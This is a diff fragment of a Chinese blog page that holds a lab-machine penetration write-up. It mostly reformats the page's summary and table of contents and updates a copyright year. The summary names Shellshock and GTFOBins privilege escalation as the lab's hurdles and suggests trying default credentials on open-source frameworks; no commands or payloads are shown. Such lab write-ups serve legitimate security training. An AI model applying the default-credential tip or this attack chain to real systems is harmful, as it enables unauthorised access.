+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
 <p>本台靶机到此结束！</p>
 <h1 id="总结">总结</h1>
-<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及 <strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
+<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及
+<strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
 <p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
 
   </div>
@@ -348,7 +366,8 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Common Gateway Interface 基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">破壳漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">前置技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.1.</span> <span class="toc-text">bash基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.</span> <span class="toc-text">利用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="toc-number">4.3.</span> <span class="toc-text">破壳漏洞get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Common Gateway Interface
+基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">破壳漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">前置技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.1.</span> <span class="toc-text">bash基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.</span> <span class="toc-text">利用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="toc-number">4.3.</span> <span class="toc-text">破壳漏洞get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -383,7 +402,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
